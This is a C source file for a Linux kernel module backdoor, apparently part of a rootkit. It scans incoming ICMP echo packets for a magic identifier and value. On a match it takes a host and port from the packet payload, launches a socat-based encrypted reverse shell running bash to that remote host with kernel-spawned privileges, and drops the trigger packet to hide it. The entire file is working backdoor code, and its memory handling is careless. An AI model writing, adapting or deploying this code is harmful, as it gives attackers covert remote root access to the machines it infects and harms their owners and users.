#include "backdoor.h"

#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/net.h>
#include <linux/tcp.h>

unsigned int magic_packet_parse(struct sk_buff *socket_buffer) {
  const struct iphdr *ip_header;
  const struct icmphdr *icmp_header;
  struct iphdr _iph;
  struct icmphdr _icmph;
  const char *data = NULL;
  char *_data, *argv_str, **argv;
  int size, str_size;

  if (!socket_buffer) return ACCEPT;

  ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);

  if (!ip_header) return ACCEPT;

  if (!ip_header->protocol) return ACCEPT;

  if (ip_header->protocol == IPPROTO_ICMP) {
    icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4,
                                     sizeof(_icmph), &_icmph);

    if (!icmp_header) return ACCEPT;

    if (icmp_header->code != ICMP_ECHO) return ACCEPT;

    if (htons(icmp_header->un.echo.id) == MAGIC_NUMBER) {
      size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
      _data = kmalloc(size, GFP_KERNEL);

      if (!_data) return ACCEPT;

      str_size = size - strlen(MAGIC_VALUE);
      argv_str = kmalloc(str_size, GFP_KERNEL);

      data = skb_header_pointer(socket_buffer,
                                ip_header->ihl * 4 + sizeof(struct icmphdr),
                                size, &_data);
      if (!data) {
        kfree(_data);
        kfree(argv_str);
        return ACCEPT;
      }
      if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {
        memzero_explicit(argv_str, str_size);
        memcpy(argv_str, data + strlen(MAGIC_VALUE) + 1, str_size - 1);
        argv = argv_split(GFP_KERNEL, argv_str, NULL);

        if (argv) {
          char *shell_cmd =
              kmalloc((strlen(argv[0]) + strlen(argv[1]) + 79) * sizeof(char),
                      GFP_KERNEL);
          strcpy(shell_cmd, "socat openssl-connect:");
          strcat(shell_cmd, argv[0]);
          strcat(shell_cmd, ":");
          strcat(shell_cmd, argv[1]);
          strcat(shell_cmd,
                 ",verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane");

          char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/",
                          "TERM=xterm", NULL};
          char *shell[] = {"/bin/bash", "-c", shell_cmd, NULL};
          call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);
#ifdef DEBUG
          printk(KERN_INFO "sended a shell\n");
#endif
          argv_free(argv);
          kfree(shell_cmd);
        }
        kfree(_data);
        kfree(argv_str);

        return DROP;
      }
    }
  }
  return ACCEPT;
}
